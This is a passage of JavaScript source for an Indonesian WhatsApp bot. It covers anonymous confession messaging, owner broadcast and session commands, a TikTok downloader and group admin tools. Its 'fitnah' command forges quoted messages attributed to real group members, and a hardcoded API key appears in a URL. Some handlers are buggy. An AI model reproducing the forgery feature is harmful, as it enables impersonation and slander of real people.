text: tulis_pesan,
footer: 'klik button untuk menghapus sesi chat',
buttons: [
{ buttonId: '#stopchat', buttonText: {displayText: '️䳈 Sᴛᴏᴘ'}, type: 1}
],
headerType: 1
}
conn.sendMessage(id_satu, buttonMessage)
conn.sendMessage(id_dua, buttonMessage)
}
break
case 'skip':
case 'stopchat':
if (cekPesan("id", sender) == null) return reply(`Kamu sedang tidak didalam roomchat, Silahkan buat room dengan contoh dibawah ini.\n\n*Example:*\n#menfess num|nama|pes\n\n*Contoh:*\n#menfess 628xxx|bot|hai\n\n*Note:*\n6285789004732 - benar (✅)\n+62 857 8900 4732 - salah (❌)`)
if (isGroup) return reply(mess.OnlyPM)
var aku = sender
var dia = cekPesan("teman", aku)
var teks_aku = `[✓] *Berhasil memberhentikan chat*`
setRoom("±teman", dia, null)
setRoom("±teman", aku, null)
await sleep(2000)
conn.sendMessage(aku,{text:teks_aku})
setRoom("±id", aku, null)
setRoom("±id", dia, null)
var teks_dia = `[✓] *Room chat telah dihentikan*\n*oleh patner chat kamu.*`
conn.sendMessage(dia,{text:teks_dia})
break
case 'confes':
case 'confess':
case 'secretchat':{
if (cekPesan("id", sender) !== null) return reply("Kamu Sedang Didalam roomchat ketik *#stopchat* untuk menghapus sesi chat.")
if (!q) return reply(`Format invalid!!\n\n*Example:*\n${prefix+command} number|nama\n\n*Contoh:*\n${prefix+command} 628xxx|bot\n\n_isi number yg sesuai perintah bot_\n\n*Contoh*\n628xxx > benar\n+628xxx > salah\n\ntanpa spasi dan tanda +`)
let num = q.split('|')[0]
if (!num) return reply('Number tujuan wajib di isi')
let nama_pengirim = q.split('|')[1]
if (num == sender.split('@')[0]) return reply('Ngirim ke nomor sendiri:v\ncapek ya? semangat🗿')
if (!nama_pengirim) return reply('Nama kamu wajib di isi')
var cekap = await conn.onWhatsApp(num+"@s.whatsapp.net")
if (cekap.length == 0) return reply(`Nomor +${num}\ntidak terdaftar di WhatsApp`)
var penerimanyo = num+'@s.whatsapp.net'
mentions(`Berhasil mengirimkan undangan chat ke @${penerimanyo.split('@')[0]} tunggu dia menyetujui undangan tersebut untuk chatan secara anonim jadi dia tidak tau siapa anda`, [penerimanyo])
let roomC = `#${makeid(10)}`
var text_tersambung =`*Seseorang Mengajak Chating*\n\n*Dari:* ${nama_pengirim}\n\nSilahkan klik button nya kak jika ingin menghubungkan chat!!`
let btn_room = [{ buttonId: `${prefix}auto_room ${sender}|${penerimanyo}|${roomC}`, buttonText: { displayText: '䳈 Bᴀʟᴀs Cʜᴀᴛ' }, type: 1 }]
var but_room = {
location: { jpegThumbnail: await reSize(fs.readFileSync(`./media/confess.jpg`), 200, 100) },
caption: text_tersambung,
footer: 'Klik button untuk menerima chat.',
buttons: btn_room,
mentions: [penerimanyo],
headerType: 1
}
conn.sendMessage(penerimanyo, but_room)
}
break
case 'menfes': case 'menfess':{
if (cekPesan("id", sender) !== null) return reply("Kamu Sedang Didalam roomchat ketik *#stopchat* untuk menghapus sesi chat.")
if (!q) return reply(`Format Fitur Menfess / Kirim pesan rahasia ke seseorang Lewat bot\n\n_*Example*_\n${prefix+command} wa|pengirim|pesan\n\n_*Contoh*_\n${prefix+command} 6285789004732|bot|hai\n\n*Note :*\nBerawal dari 628xxx tanpa spasi`)
let num = q.split('|')[0]
let nama_pengirim = q.split('|')[1]
let pesan_teman = q.split('|')[2]
var cekap = await conn.onWhatsApp(num+"@s.whatsapp.net")
if (cekap.length == 0) return reply(`Nomor +${num}\ntidak terdaftar di WhatsApp`)
let roomC = `#${makeid(10)}`
if (num == botNumber.split('@')[0]) return reply('Itu kan nomor bot')
if (num == sender.split('@')[0]) return reply('Menfes ke nomor sendiri:v\ncapek ya? semangat🗿')
if (!num) return reply(`Harus di isi semua !!\nex : ${prefix+command} 62857xxx|nama|hallo\n\nnomor WhatsApp yang aktif tanpa +/spasi`)
if (!nama_pengirim) return reply(`Harus di isi semua !!\nex : ${prefix+command} 62857xxx|nama|hallo\n\nnomor hp tanpa spasi`)
if (!pesan_teman) return reply(`Harus di isi semua !!\nex : ${prefix+command} 62857xxx|nama|hallo\n\nnomor hp tanpa spasi`)
var penerimanyo = num+'@s.whatsapp.net'
mentions(`Berhasil mengirimkan pesan menfess ke @${penerimanyo.split('@')[0]} Semoga pesan ada di Balas 👍.`, [penerimanyo])
let text_menfess = `_Hallo Kak ${ucapanWaktu}_\n_Ada pesan *Menfess/Rahasia*_\n\n*👤• Dari :* ${nama_pengirim}\n*✉️• Pesan :* ${pesan_teman}\n\n_Pesan ini ditulis oleh seseorang_\n_Bot hanya menyampaikan saja._`
let btn_menfes = [{ buttonId: `${prefix}auto_room ${sender}|${num}@s.whatsapp.net|${roomC}`, buttonText: { displayText: '䳈 Bᴀʟᴀs Cʜᴀᴛ' }, type: 1 }]
var button_menfess = {
 location: { jpegThumbnail: await reSize(fs.readFileSync(`./media/menfess.jpg`), 200, 100) },
caption: text_menfess,
footer: 'Klik button untuk membalas chat.',
buttons: btn_menfes,
headerType: 1
}
conn.sendMessage(`${num}@s.whatsapp.net`, button_menfess)
}
break
case 'secret':{
if (cekPesan("id", sender) !== null) return reply("Kamu Sedang Didalam roomchat ketik *#stopchat* untuk menghapus sesi chat.")
if (!q) return reply(`Format Fitur Secrett / Kirim pesan rahasia ke seseorang Lewat bot\n\n_*Example*_\n${prefix+command} wa|pengirim\n\n_*Contoh*_\n${prefix+command} 628xxxx|Rama\n\n*Note :*\nBerawal dari 628xxx tanpa spasi`)
let num = q.split('|')[0]
let nama_pengirim = q.split('|')[1]
var cekap = await conn.onWhatsApp(num+"@s.whatsapp.net")
if (cekap.length == 0) return reply(`Nomor +${num}\ntidak terdaftar di WhatsApp`)
let roomC = `#${makeid(10)}`
if (num == botNumber.split('@')[0]) return reply('Itu kan nomor bot')
if (num == sender.split('@')[0]) return reply('Menfes ke nomor sendiri:v\ncapek ya? semangat🗿')
if (!num) return reply(`Harus di isi semua !!\nex : ${prefix+command} 62857xxx|nama|hallo\n\nnomor hp tanpa spasi`)
if (!nama_pengirim) return reply(`Harus di isi semua !!\nex : ${prefix+command} 62857xxx|nama|hallo\n\nnomor hp tanpa spasi`)
var penerimanyo = num+'@s.whatsapp.net'
mentions(`Berhasil mengirimkan undangan chat ke @${penerimanyo.split('@')[0]} tunggu dia menyetujui undangan tersebut untuk chatan secara anonim jadi dia tidak tau siapa anda`, [penerimanyo])
setRoom("±id", sender, penerimanyo)
setRoom("±id", penerimanyo, sender)
setRoom("±teman", sender, penerimanyo)
setRoom("±teman", penerimanyo, sender)
let text_menfess = `_Hallo Kak ${ucapanWaktu}_\n_Ada pesan *Secret/Rahasia*_\n\n*• Dari :* ${nama_pengirim}\n\n_Pesan ini ditulis oleh seseorang_\n_Bot hanya menyampaikan saja._`
let btn_menfes = [
{ buttonId: `${prefix}auto_room ${sender}|${num}@s.whatsapp.net|${roomC}`, buttonText: { displayText: '䳈 Tᴇʀɪᴍᴀ' }, type: 1 },
{ buttonId: `${prefix}tolak_secret ${sender}`, buttonText: { displayText: '䳈 Tᴏʟᴀᴋ' }, type: 1 }
]
var button_menfess = {
text: text_menfess,
footer: 'Klik button untuk membalas chat.',
buttons: btn_menfes,
headerType: 1
}
conn.sendMessage(`${num}@s.whatsapp.net`, button_menfess)
}
break
case 'tolak_secret':{
reply('Secret ditolak')
var aku = q
var dia = cekPesan("teman", aku, null)
var teks_aku = `Maaf kak undangan secretchat @${aku.split('@')[0]} Ditolak`
setRoom("±id", aku, null)
setRoom("±teman", aku, null)
setRoom("±id", dia, null)
setRoom("±teman", dia, null)
await sleep(2000)
conn.sendMessage(aku, {text:teks_aku, mentions:[aku]})
}
break
//»»————- ★ OWNER MENU ★ ————-««
case 'join':{
 if (!isOwner) return reply(mess.OnlyOwner)
if (!q) return reply(`Kirim perintah ${prefix+command} _linkgrup_`)
var ini_urrrl = q.split('https://chat.whatsapp.com/')[1]
var data = await conn.groupAcceptInvite(ini_urrrl)
reply('*Sukses Join The Group..*')
}
break
case 'resetdb':{
if (!isOwner) return reply(mess.OnlyOwner)
let para_kos = "[]"
db_user.splice(para_kos)
fs.writeFileSync('./database/pengguna.json', JSON.stringify(db_user, null, 1))
await sleep(1000)
db_menfes.splice(para_kos)
fs.writeFileSync('./database/menfess.json', JSON.stringify(db_menfes, null, 1))
await sleep(1000)
db_error.splice(para_kos)
fs.writeFileSync('./database/error.json', JSON.stringify(db_error, null, 1))
reply('Sukses restart database')
}
break
case 'chat':
case 'start':{
if (cekUser("id", sender) == null) return conn.sendMessage(from, { text: mess.OnlyUser, buttons: [{ buttonId: '#verify', buttonText: { displayText: 'Verify' }, type: 1 }], footer: `Powerd By - @${setting.kontakOwner}`, mentions: [setting.ownerNumber, sender]}, { quoted: fkontak })
var arr_rows = []
for (let i of db_user) {
arr_rows.push({
title: i.name,
rowId: `${prefix}start_conn ${i.id}|${sender}|${cekUser("name", sender)}`
})
}
var listMsg = {
text: `Hai @${sender.split("@")[0]}`,
buttonText: 'Pilih User',
footer: `silahkan pilih user yang mau\ndi ajak ngobrol/chat anonymous`,
mentions: [sender],
sections: [{
title: '© Anonymous Chat', rows: arr_rows
}]
}
conn.sendMessage(from, listMsg)
}
break
case 'start_conn':{
if (q.split('|')[0] == sender) return reply('Itu username kamu sendiri kak')
if (cekUser("id", sender) == null) return conn.sendMessage(from, { text: mess.OnlyUser, buttons: [{ buttonId: '#verify', buttonText: { displayText: 'Verify' }, type: 1 }], footer: `Powerd By - @${setting.kontakOwner}`, mentions: [setting.ownerNumber, sender]}, { quoted: fkontak })
var penerimanyo = q.split('|')[0]
var penerimanya = q.split('|')[1]
var nama_pengirim = q.split('|')[2]
mentions(`Berhasil mengirimkan undangan chat ke @${penerimanyo.split('@')[0]} tunggu dia menyetujui undangan tersebut untuk chatan secara anonim jadi dia tidak tau siapa anda`, [penerimanyo])

setRoom("±id", penerimanya, penerimanyo)
setRoom("±teman", penerimanyo, penerimanya)
setRoom("±id", penerimanyo, penerimanya)
setRoom("±teman", penerimanya, penerimanyo)

let roomC = `#${makeid(10)}`
var text_tersambung =`*Hallo ${cekUser("name", penerimanyo)} ${ucapanWaktu}*\n*Seseorang Mengajak Chating*\n\n*Dari:* ${nama_pengirim}\n\nSilahkan klik button ya kak jika ingin menghubungkan chat *ANONYMOUS*`
let btn_room = [
{ buttonId: `${prefix}auto_room ${penerimanyo}|${penerimanya}|${roomC}`, buttonText: { displayText: '䳈 Tᴇʀɪᴍᴀ' }, type: 1 },
{ buttonId: `${prefix}tolak_secret ${penerimanyo}`, buttonText: { displayText: '䳈 Tᴏʟᴀᴋ' }, type: 1 }
]
var but_room = {
text: text_tersambung,
footer: 'Klik button untuk menerima chat.',
buttons: btn_room,
mentions: [penerimanyo],
headerType: 1
}
conn.sendMessage(penerimanyo, but_room)
}
break
case 'listuser':
case 'listpc':{
if (!isOwner) return reply(mess.OnlyOwner)
let teks =`*-----DATA USER-----*\n\n Terdaftar : ${("id", db_user).length}\n Room Chat : ${db_menfes.length}\n\n`
for (let i of db_user){
teks +=` ID : @${i.id.split('@')[0]}\n Name : ${i.name}\n Premium : (${i.premium? '✓':'✘'})\n\n`
}
reply(teks)
}
break
case 'error':{
if (!isOwner) return reply(mess.OnlyOwner)
let ertxt = `*Server Error*\n*Tercatat:* ${db_error.length}\n\n`
for (let i of db_error){
ertxt +=`*Pengguna:* @${i.user.split('@')[0]}\n*Jam:* ${i.jam} WIB\n*Tanggal:* ${i.tanggal}\n*Type:* ${i.error}\n\n`
}
conn.sendMessage(from, {text:ertxt}, {quoted:msg})
}
break
case 'mysesi': case 'sendsesi': case 'session':{
if (!isOwner) return reply(mess.OnlyOwner)
reply('please wait..')
await sleep(3000)
var user_bot = await fs.readFileSync('./database/pengguna.json')
var sesi_bot = await fs.readFileSync(`./${setting.sessionName}.json`)
conn.sendMessage(from, { document: sesi_bot, mimetype: 'document/application', fileName: 'session.json'}, {quoted:msg})
conn.sendMessage(from, { document: user_bot, mimetype: 'document/application', fileName: 'pengguna.json'}, {quoted:msg})
}
break
case 'block':{
if (!isOwner && !fromMe) return reply(mess.OnlyOwner)
if (!q) return reply(`Ex : ${prefix+command} Nomor Yang Ingin Di Block\n\nContoh :\n${prefix+command} 628xxxx`)
let nomorNya = q
await conn.updateBlockStatus(`${nomorNya}@s.whatsapp.net`, "block") // Block user
reply('Sukses Block Nomor')
}
break
case 'unblock':{
if (!isOwner && !fromMe) return reply(mess.OnlyOwner)
if (!q) return reply(`Ex : ${prefix+command} Nomor Yang Ingin Di Unblock\n\nContoh :\n${prefix+command} 628xxxx`)
let nomorNya = q
await conn.updateBlockStatus(`${nomorNya}@s.whatsapp.net`, "unblock")
reply('Sukses Unblock Nomor')
}
break
//»»————- ★ BROADCAST★ ————-««
case 'bctext':
case 'bc':
case 'broadcast':{
if (!isOwner) return reply(mess.OnlyOwner)
if (!q) return reply(`Masukan parameter text\n*Contoh:*\n${prefix+command} hallo`)
let db_orang = JSON.parse(fs.readFileSync('./database/pengguna.json'));
let data_teks = `${q}`
for (let i of db_orang){ 
var button_broadcast = {text: data_teks, footer: '©broadcast', buttons: [{ buttonId: '!menu', buttonText: {displayText: '䳈 Mᴇɴᴜ'}, type: 1}],headerType: 1}
conn.sendMessage(i.id, button_broadcast)
await sleep(2000)
}
reply(`*Sukses mengirim broadcast text ke ${db_orang.length} user*`)
}
break
case 'broadcastvidio':
case 'bcvideo':
case 'bcvidio':{
if (!isOwner) return reply(mess.OnlyOwner)
if (isVideo || isQuotedVideo){
await conn.downloadAndSaveMediaMessage(msg, 'video', `./sticker/${sender.split("@")[0]}.mp4`)
reply(mess.wait)
var bc_video = `./sticker/${setting.ownerNumber.split('@')[0]}.mp4`
for (let i of db_user){
conn.sendMessage(i.id, {video:{url:bc_video}, caption:'Siaran dari owner🔊\n*>Broadcast*'}, {quoted: fbc})
await sleep(2000)
}
reply(`*Sukses mengirim broadcast video ke ${db_user.length} user*`)
fs.unlinkSync(bc_video)
} else {
reply(`*kirim video dengan caption ${prefix+command} atau reply video dengan pesan ${prefix+command}*`)
}
}
break
case 'broadcastimage':
case 'bcgambar':
case 'bcimage':{
if (!isOwner) return reply(mess.OnlyOwner)
if (isImage || isQuotedImage){
await conn.downloadAndSaveMediaMessage(msg, 'image', `./sticker/${sender.split("@")[0]}.jpg`)
reply(mess.wait)
var bc_image = `./sticker/${setting.ownerNumber.split('@')[0]}.jpg`
for (let i of db_user){
conn.sendMessage(i.id, {image:{url:bc_image}, caption:'Siaran dari owner🔊\n*>broadcast*'}, {quoted: fbc})
await sleep(2000)
}
reply(`*Sukses mengirim broadcast image ke ${db_user.length} user*`)
fs.unlinkSync(bc_image)
} else {
reply(`*kirim gambar dengan caption ${prefix+command} atau reply gambar dengan caption ${prefix+command}*`)
}
}
break
case 'bcaudio':{
if (!isOwner) return reply(mess.OnlyOwner)
if (isQuotedAudio){
await conn.downloadAndSaveMediaMessage(msg, 'audio', `./sticker/${sender.split("@")[0]}.mp3`)
reply(mess.wait)
var bc_audio = `./sticker/${setting.ownerNumber.split('@')[0]}.mp3`
for (let i of db_user){
conn.sendMessage(i.id, {audio:{url:bc_audio}, mimetype:'audio/mpeg', fileName:'bcaudio.mp3'}, {quoted: fbc})
await sleep(2000)
}
reply(`*Sukses mengirim broadcast audio ke ${db_user.length} user*`)
fs.unlinkSync(bc_audio)
} else {
reply(`*reply audio dengan pesan ${prefix+command}*\nAtau ketik _#caraBc_ untuk melihat cara broadcast`)
}
}
break
case 'tutorBc':
case 'caraBc':
if (!isOwner) return reply(mess.OnlyOwner)
reply(`*CONTOH BROADCAST*

*Broadcast Text📋*
_Command :_ #bc / #broadcast 
Contoh : #bc <text>

*broadcast Video🎥*
_Command :_ #bcvidio
Contoh : #bcvideo <reply video>

*broadcast Image🖼️*
_Command :_ #bcimage / #bcgambar
Contoh : #bcimage <reply image>

*Broadcast Audio📼*
_Command :_ #bcaudio
Contoh : #bcaudio <reply audio>

*Keterangan*
-bc : Broadcast
-broadcast : Siaran ke semua pengguna bot
`)
break
case 'runtime':
case 'tes':
reply(`*Runtime : ${runtime(process.uptime())}*`)
break
case 'ping':
reply(`*Runtime : ${runtime(process.uptime())}*⏰`)
break

case 'tiktoknowm':
case 'tiktok':{
if (!q) return reply('contoh :\n#tiktok https://vt.tiktok.com/ZSRG695C8/')
 var lainya = q
if (!isUrl(lainya)) return reply(mess.error.Iv)
reply(mess.wait)
var tt_res = await fetchJson(`https://saipulanuar.ga/api/download/tiktok2?url=${q}&apikey=dyJhXvqe`)
.then(tt_res => {
reply(`𝗧𝗜𝗞𝗧𝗢𝗞 𝗗𝗢𝗪𝗡𝗟𝗢𝗔𝗗

𝘼𝙪𝙩𝙝𝙤𝙧: Ramaa Gnnz
𝙅𝙪𝙙𝙪𝙡: ${tt_res.result.judul}
𝙎𝙤𝙪𝙧𝙘𝙚: ${q}

Video sedang dikirim...`)
conn.sendMessage(from,{video:{url:tt_res.result.video.link2}, caption:'No Watermark!'}, {quotes:msg})
}).catch((err) => {
reply('Terjadi Kesalahan!!\ncontoh :#tiktok https://vt.tiktok.com/ZSRG695C8/')
})
}
break

//»»————- ★ GROUP MENU ★ ————-««
case 'hidetag':
case 'h':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
let mem = [];
groupMembers.map( i => mem.push(i.id) )
conn.sendMessage(from, { text: q ? q : '', mentions: mem })
break
case 'welcome':{
if (!isGroup) return reply('Khusus Group!') 
if (!msg.key.fromMe && !isOwner && !isGroupAdmins) return reply("Mau ngapain?, Fitur ini khusus admin")
if (!args[0]) return reply(`Kirim perintah #${command} _options_\nOptions : on & off\nContoh : #${command} on`)
if (args[0] == 'ON' || args[0] == 'on' || args[0] == 'On') {
if (isWelcome) return reply('Sudah aktif✓')
welcome.push(from)
fs.writeFileSync('./database/welcome.json', JSON.stringify(welcome))
reply('Suksess mengaktifkan welcome di group:\n'+groupName)
} else if (args[0] == 'OFF' || args[0] == 'OF' || args[0] == 'Of' || args[0] == 'Off' || args[0] == 'of' || args[0] == 'off') {
var posi = welcome.indexOf(from)
welcome.splice(posi, 1)
fs.writeFileSync('./database/welcome.json', JSON.stringify(welcome))
reply('Success menonaktifkan welcome di group:\n'+groupName)
} else { reply('Kata kunci tidak ditemukan!') }
}
break
case 'fitnah':
if (!isGroup) return reply(mess.OnlyGrup)
if (!q) return reply(`Kirim perintah #*${command}* @tag|pesantarget|pesanbot`)
var org = q.split("|")[0]
var target = q.split("|")[1]
var bot = q.split("|")[2]
if (!org.startsWith('@')) return reply('Tag orangnya')
if (!target) return reply(`Masukkan pesan target!`)
if (!bot) return reply(`Masukkan pesan bot!`)
var mens = parseMention(target)
var msg1 = { key: { fromMe: false, participant: `${parseMention(org)}`, remoteJid: from ? from : '' }, message: { extemdedTextMessage: { text: `${target}`, contextInfo: { mentionedJid: mens }}}}
var msg2 = { key: { fromMe: false, participant: `${parseMention(org)}`, remoteJid: from ? from : '' }, message: { conversation: `${target}` }}
conn.sendMessage(from, { text: bot, mentions: mentioned }, { quoted: mens.length > 2 ? msg1 : msg2 })
break
case 'del':
case 'delete':
if (cekUser("id", sender) == null) return conn.sendMessage(from, { text: mess.OnlyUser, buttons: [{ buttonId: '#verify', buttonText: { displayText: 'Verify' }, type: 1 }], footer: `Powerd By - @${setting.kontakOwner}`, mentions: [setting.ownerNumber, sender]}, { quoted: fkontak })
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
if (!quotedMsg) return reply(`Balas chat dari bot yang ingin dihapus`)
if (!quotedMsg.fromMe) return reply(`Hanya bisa menghapus chat dari bot`)
conn.sendMessage(from, { delete: { fromMe: true, id: quotedMsg.id, remoteJid: from }})
break
case 'linkgrup': case 'linkgc':
if (cekUser("id", sender) == null) return conn.sendMessage(from, { text: mess.OnlyUser, buttons: [{ buttonId: '#verify', buttonText: { displayText: 'Verify' }, type: 1 }], footer: `Powerd By - @${setting.kontakOwner}`, mentions: [setting.ownerNumber, sender]}, { quoted: fkontak })
if (!isGroup) return reply(mess.OnlyGrup)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
var url = await conn.groupInviteCode(from).catch(() => reply(mess.error.api))
url = 'https://chat.whatsapp.com/'+url
reply(url)
break
case 'kick':
if (!isGroup) return reply(mess.OnlyGroup)
if (!isGroupAdmins) return reply(mess.GrupAdmin)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
var number;
if (mentionUser.length !== 0) {
number = mentionUser[0]
conn.groupParticipantsUpdate(from, [number], "remove")
.then( res => 
reply(`*Sukses mengeluarkan member..!*`))
.catch((err) => reply(mess.error.api))
} else if (isQuotedMsg) {
number = quotedMsg.sender
conn.groupParticipantsUpdate(from, [number], "remove")
.then( res => 
reply(`*Sukses mengeluarkan member..!*`))
.catch((err) => reply(mess.error.api))
} else {
reply(`Tag atau balas pesan orang yang ingin dikeluarkan dari grup`)
}
break
case 'setppgrup': case 'setppgc':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins) return reply(mess.GrupAdmin)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
if (isImage && isQuotedImage) return reply(`Kirim gambar dengan caption *#bukti* atau reply gambar yang sudah dikirim dengan caption *#bukti*`)
await conn.downloadAndSaveMediaMessage(msg, "image", `./transaksi/${sender.split('@')[0]}.jpg`)
var media = `./transaksi/${sender.split('@')[0]}.jpg`
await conn.updateProfilePicture(from, { url: media })
await sleep(2000)
reply('Sukses mengganti foto profile group')
fs.unlinkSync(media)
break
case 'setnamegrup': case 'setnamegc':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins) return reply(mess.GrupAdmin)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
if (!q) return reply(`Kirim perintah #${command} teks`)
await conn.groupUpdateSubject(from, q)
.then( res => {
reply(`Sukses`)
}).catch(() => reply(mess.error.api))
break
case 'setdesc': case 'setdescription':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins) return reply(mess.GrupAdmin)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
if (!q) return reply(`Kirim perintah ${command} teks`)
await conn.groupUpdateDescription(from, q)
.then( res => {
reply(`Sukses`)
}).catch(() => reply(mess.error.api))
break
case 'group': case 'grup':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins) return reply(mess.GrupAdmin)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
if (!q) return reply(`Kirim perintah #${command} _options_\nOptions : close & open\nContoh : #${command} close`)
if (args[0] == "close") {
conn.groupSettingUpdate(from, 'announcement')
reply(`Sukses mengizinkan hanya admin yang dapat mengirim pesan ke grup ini`)
} else if (args[0] == "open") {
conn.groupSettingUpdate(from, 'not_announcement')
reply(`Sukses mengizinkan semua peserta dapat mengirim pesan ke grup ini`)
} else {
reply(`Kirim perintah #${command} _options_\nOptions : close & open\nContoh : #${command} close`)
}
break
case 'revoke':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins) return reply(mess.GrupAdmin)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
await conn.groupRevokeInvite(from)
.then( res => {
reply(`Sukses menyetel tautan undangan grup ini`)
}).catch(() => reply(mess.error.api))
break
case 'tagall':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
if (!q) return reply(`Teks?`)
let teks_tagall = `══✪〘 *👥 Tag All* 〙✪══\n\n${q ? q : ''}\n\n`
for (let mem of participants) {
teks_tagall += `➲ @${mem.id.split('@')[0]}\n`
}
conn.sendMessage(from, { text: teks_tagall, mentions: participants.map(a => a.id) }, { quoted: msg })
break
case 'antilink':{
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
if (!args[0]) return reply(`Kirim perintah #${command} _options_\nOptions : on & off\nContoh : #${command} on`)
if (args[0] == 'ON' || args[0] == 'on' || args[0] == 'On') {
if (isAntiLink) return reply('Antilink sudah aktif')
antilink.push(from)
fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink, null, 2))
reply('Successfully Activate Antilink In This Group')
} else if (args[0] == 'OFF' || args[0] == 'OF' || args[0] == 'Of' || args[0] == 'Off' || args[0] == 'of' || args[0] == 'off') {
if (!isAntiLink) return reply('Antilink belum aktif')
let anu = antilink.indexOf(from)
antilink.splice(anu, 1)
fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink, null, 2))
reply('Successfully Disabling Antilink In This Group')
} else { reply('Kata kunci tidak ditemukan!') }
}
break
case 'tiktokauto':{
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
if (!args[0]) return reply(`Kirim perintah #${command} _options_\nOptions : on & off\nContoh : #${command} on`)
if (args[0] == 'ON' || args[0] == 'on' || args[0] == 'On') {
if (isAutoDownloadTT) return reply('tiktokAuto sudah aktif')
DB_Tiktok.push(from)
fs.writeFileSync('./database/antilink.json', JSON.stringify(DB_Tiktok, null, 2))
reply('Successfully Activate tiktokAuto In This Group')
} else if (args[0] == 'OFF' || args[0] == 'OF' || args[0] == 'Of' || args[0] == 'Off' || args[0] == 'of' || args[0] == 'off') {
if (!isAutoDownloadTT) return reply('tiktokAuto belum aktif')
DB_Tiktok.splice(anu, 1)
fs.writeFileSync('./database/antilink.json', JSON.stringify(DB_Tiktok, null, 2))
reply('Successfully Disabling tiktokAuto In This Group')
} else { reply('Kata kunci tidak ditemukan!') }
}
break
case 'promote':
if (!isOwner) return reply(mess.OnlyOwner)
if (!isGroup) return reply(mess.OnlyGroup)
if (!isGroupAdmins) return reply(mess.GrupAdmin)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
conn.groupParticipantsUpdate(from, [mentionUser[0]], "promote")
.then( res => { mentions(`Sukses menjadikan @${mentionUser[0].split("@")[0]} sebagai admin`, [mentionUser[0]], true) })
.catch(() => reply(mess.error.api))
 if (isQuotedMsg) 
conn.groupParticipantsUpdate(from, [quotedMsg], "promote")
.then( res => { mentions(`Sukses menjadikan @${quotedMsg.sender.split("@")[0]} sebagai admin`, [quotedMsg.sender], true) })
.catch(() => reply(mess.error.api))
reply(`Tag atau balas pesan member yang ingin dijadikan admin`)
break

case 'demote':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins) return reply(mess.GrupAdmin)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
if (mentionUser.length !== 0) {
conn.groupParticipantsUpdate(from, [mentionUser[0]], "demote")
.then( res => { mentions(`Sukses menjadikan @${mentionUser[0].split("@")[0]} sebagai member biasa`, [mentionUser[0]], true) })
.catch(() => reply(mess.error.api))
} else if (isQuotedMsg) {
conn.groupParticipantsUpdate(from, [quotedMsg.sender], "demote")
.then( res => { mentions(`Sukses menjadikan @${quotedMsg.sender.split("@")[0]} sebagai member biasa`, [quotedMsg.sender], true) })
.catch(() => reply(mess.error.api))
} else {
reply(`Tag atau balas pesan admin yang ingin dijadikan member biasa\n\n*Contoh:*\n${prefix+command} @tag`)
}
break
case 'add':
if (!isGroup) return reply(mess.OnlyGroup)
if (!isGroupAdmins) return reply(mess.GrupAdmin)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
if (groupMembers.length == 512) return reply(`Anda tidak dapat menambah peserta, karena Grup sudah penuh!`)
var mems = []
groupMembers.map( i => mems.push(i.id) )
var number;
if (args.length > 1) {
var number = q+'@s.whatsapp.net'
var cek = await conn.onWhatsApp(number)
if (cek.length == 0) return reply(`Masukkan nomer yang valid dan terdaftar di WhatsApp`)
if (mems.includes(number)) return reply(`Nomer tersebut sudah berada didalam grup!`)
conn.groupParticipantsUpdate(from, [number], "add")
.then( res => {
reply(`Suksess menambahkan member baru`)
}).catch((err) => reply(mess.error.api))
} else if (isQuotedMsg) {
number = quotedMsg
var cek = await conn.onWhatsApp(number)
if (cek.length == 0) return reply(`Peserta tersebut sudah tidak terdaftar di WhatsApp`)
if (mems.includes(number)) return reply(`Nomer tersebut sudah berada didalam grup!`)
conn.groupParticipantsUpdate(from, [number], "add")
.then( res => {
reply(`Suksess menambahkan member baru`)
}).catch((err) => reply(mess.error.api))
} else {
reply(`Kirim perintah ${prefix+command} nomer atau balas pesan orang yang ingin dimasukkan`)
}
break

//»»————- ★ GAME MENU ★ ————-««
case 'tebakkata':{
if (cekUser("id", sender) == null) return conn.sendMessage(from, { text: mess.OnlyUser, buttons: [{ buttonId: '#verify', buttonText: { displayText: 'Verify' }, type: 1 }], footer: `Powerd By - @${setting.kontakOwner}`, mentions: [setting.ownerNumber, sender]}, { quoted: fkontak })
if (cekGame("id", sender, tebakkata) !== null) return reply("Kamu masih ada sesi yang belum di selesaikan.")
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkata.json')
let result = anu[Math.floor(Math.random() * anu.length)]
tebakkata.push({id: sender, jawaban: result.jawaban})
fs.writeFileSync('./database/game/tebakkata.json', JSON.stringify(tebakkata))
conn.sendMessage(from, { text: `Silahkan jawab pertanyaan di bawah ini\n\nSoal : ${result.soal}\nWaktu : 60 Detik`, buttons: [{ buttonId: '.nyerah', buttonText: { displayText: 'Nyerah' }, type: 1 }], footer: `Jawab pertanyaan`}, { quoted: msg })
console.log("Jawaban: " + result.jawaban)
await sleep(60000)
if (cekGame("id", sender, tebakkata) !== null) {
